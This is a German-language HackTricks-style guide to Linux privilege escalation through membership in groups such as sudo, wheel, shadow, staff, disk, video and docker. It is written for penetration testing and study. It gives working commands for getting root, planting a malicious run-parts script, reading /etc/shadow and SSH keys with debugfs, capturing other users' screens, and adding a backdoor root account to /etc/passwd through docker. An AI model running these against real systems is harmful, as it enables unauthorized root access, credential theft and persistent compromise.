# Interessante Gruppen - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Gruppen

### **PE - Methode 1**

**Manchmal**, **standardmäßig (oder weil einige Software es benötigt)** finden Sie in der **/etc/sudoers** Datei einige dieser Zeilen:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Das bedeutet, dass **jeder Benutzer, der zur Gruppe sudo oder admin gehört, alles als sudo ausführen kann**.

Wenn dies der Fall ist, um **root zu werden, können Sie einfach ausführen**:
```
sudo su
```
### PE - Methode 2

Finde alle SUID-Binärdateien und überprüfe, ob die Binärdatei **Pkexec** vorhanden ist:
```bash
find / -perm -4000 2>/dev/null
```
Wenn Sie feststellen, dass die Binärdatei **pkexec eine SUID-Binärdatei ist** und Sie zu **sudo** oder **admin** gehören, könnten Sie wahrscheinlich Binärdateien als sudo mit `pkexec` ausführen.\
Das liegt daran, dass dies typischerweise die Gruppen innerhalb der **polkit-Richtlinie** sind. Diese Richtlinie identifiziert im Grunde, welche Gruppen `pkexec` verwenden können. Überprüfen Sie es mit:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Dort finden Sie, welche Gruppen berechtigt sind, **pkexec** auszuführen, und **standardmäßig** erscheinen in einigen Linux-Distributionen die Gruppen **sudo** und **admin**.

Um **root zu werden, können Sie** Folgendes ausführen:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Wenn Sie versuchen, **pkexec** auszuführen und Sie diese **Fehlermeldung** erhalten:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Es liegt nicht daran, dass Sie keine Berechtigungen haben, sondern weil Sie ohne eine GUI nicht verbunden sind**. Und es gibt eine Lösung für dieses Problem hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Sie benötigen **2 verschiedene SSH-Sitzungen**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel-Gruppe

**Manchmal** finden Sie **standardmäßig** in der **/etc/sudoers**-Datei diese Zeile:
```
%wheel	ALL=(ALL:ALL) ALL
```
Das bedeutet, dass **jeder Benutzer, der zur Gruppe wheel gehört, alles als sudo ausführen kann**.

Wenn dies der Fall ist, um **root zu werden, können Sie einfach ausführen**:
```
sudo su
```
## Shadow Group

Benutzer aus der **Gruppe shadow** können die **/etc/shadow** Datei **lesen**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, lesen Sie die Datei und versuchen Sie, **einige Hashes zu knacken**.

## Staff-Gruppe

**staff**: Ermöglicht Benutzern, lokale Änderungen am System (`/usr/local`) vorzunehmen, ohne Root-Rechte zu benötigen (beachten Sie, dass ausführbare Dateien in `/usr/local/bin` im PATH-Variablen jedes Benutzers enthalten sind und sie die ausführbaren Dateien in `/bin` und `/usr/bin` mit demselben Namen "überschreiben" können). Vergleichen Sie mit der Gruppe "adm", die mehr mit Überwachung/Sicherheit zu tun hat. [\[source\]](https://wiki.debian.org/SystemGroups)

In Debian-Distributionen zeigt die `$PATH`-Variable, dass `/usr/local/` mit der höchsten Priorität ausgeführt wird, unabhängig davon, ob Sie ein privilegierter Benutzer sind oder nicht.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Wenn wir einige Programme in `/usr/local` übernehmen können, können wir leicht Root-Rechte erlangen.

Die Übernahme des `run-parts`-Programms ist ein einfacher Weg, um Root-Rechte zu erlangen, da die meisten Programme `run-parts` wie (crontab, bei SSH-Login) ausführen werden.
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
oder Wenn eine neue SSH-Sitzung angemeldet wird.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploits**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Dieses Privileg ist fast **äquivalent zu Root-Zugriff**, da Sie auf alle Daten innerhalb der Maschine zugreifen können.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Beachten Sie, dass Sie mit debugfs auch **Dateien schreiben** können. Um beispielsweise `/tmp/asd1.txt` nach `/tmp/asd2.txt` zu kopieren, können Sie Folgendes tun:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Wenn Sie jedoch versuchen, **Dateien, die dem Root-Benutzer gehören** (wie `/etc/shadow` oder `/etc/passwd`), zu **schreiben**, erhalten Sie einen "**Zugriff verweigert**"-Fehler.

## Video-Gruppe

Mit dem Befehl `w` können Sie **herausfinden, wer im System angemeldet ist**, und es wird eine Ausgabe wie die folgende angezeigt:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** bedeutet, dass der Benutzer **yossi physisch** an einem Terminal auf der Maschine angemeldet ist.

Die **Video-Gruppe** hat Zugriff auf die Anzeige der Bildschirmausgabe. Grundsätzlich können Sie die Bildschirme beobachten. Um dies zu tun, müssen Sie **das aktuelle Bild auf dem Bildschirm** in Rohdaten erfassen und die Auflösung ermitteln, die der Bildschirm verwendet. Die Bildschirmdaten können in `/dev/fb0` gespeichert werden, und Sie können die Auflösung dieses Bildschirms unter `/sys/class/graphics/fb0/virtual_size` finden.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Um das **raw image** zu **öffnen**, können Sie **GIMP** verwenden, die **`screen.raw`** Datei auswählen und als Dateityp **Raw image data** auswählen:

![](<../../../images/image (463).png>)

Ändern Sie dann die Breite und Höhe auf die Werte, die auf dem Bildschirm verwendet werden, und überprüfen Sie verschiedene Bildtypen (und wählen Sie denjenigen aus, der den Bildschirm am besten darstellt):

![](<../../../images/image (317).png>)

## Root-Gruppe

Es scheint, dass **Mitglieder der Root-Gruppe** standardmäßig Zugriff auf die **Änderung** einiger **Service**-Konfigurationsdateien oder einiger **Bibliotheks**-Dateien oder **anderer interessanter Dinge** haben, die zur Eskalation von Rechten verwendet werden könnten...

**Überprüfen Sie, welche Dateien Root-Mitglieder ändern können**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker-Gruppe

Sie können **das Root-Dateisystem des Host-Systems in das Volume einer Instanz einbinden**, sodass beim Start der Instanz sofort ein `chroot` in dieses Volume geladen wird. Dies gibt Ihnen effektiv Root-Zugriff auf die Maschine.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Schließlich, wenn Ihnen keine der vorherigen Vorschläge gefällt oder sie aus irgendeinem Grund nicht funktionieren (docker api firewall?), könnten Sie immer versuchen, **einen privilegierten Container auszuführen und von ihm zu entkommen**, wie hier erklärt:

{{#ref}}
../docker-security/
{{#endref}}

Wenn Sie Schreibberechtigungen über den Docker-Socket haben, lesen Sie [**diesen Beitrag darüber, wie man Privilegien durch den Docker-Socket eskaliert**](../index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Gruppe

{{#ref}}
./
{{#endref}}

## Adm Gruppe

In der Regel haben **Mitglieder** der Gruppe **`adm`** Berechtigungen, um **Protokolldateien** im Verzeichnis _/var/log/_ zu **lesen**.\
Daher sollten Sie, wenn Sie einen Benutzer in dieser Gruppe kompromittiert haben, auf jeden Fall einen **Blick auf die Protokolle** werfen.

## Auth Gruppe

Innerhalb von OpenBSD kann die **auth** Gruppe normalerweise in die Ordner _**/etc/skey**_ und _**/var/db/yubikey**_ schreiben, wenn sie verwendet werden.\
Diese Berechtigungen können mit dem folgenden Exploit missbraucht werden, um **Privilegien** auf root zu **eskalieren**: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
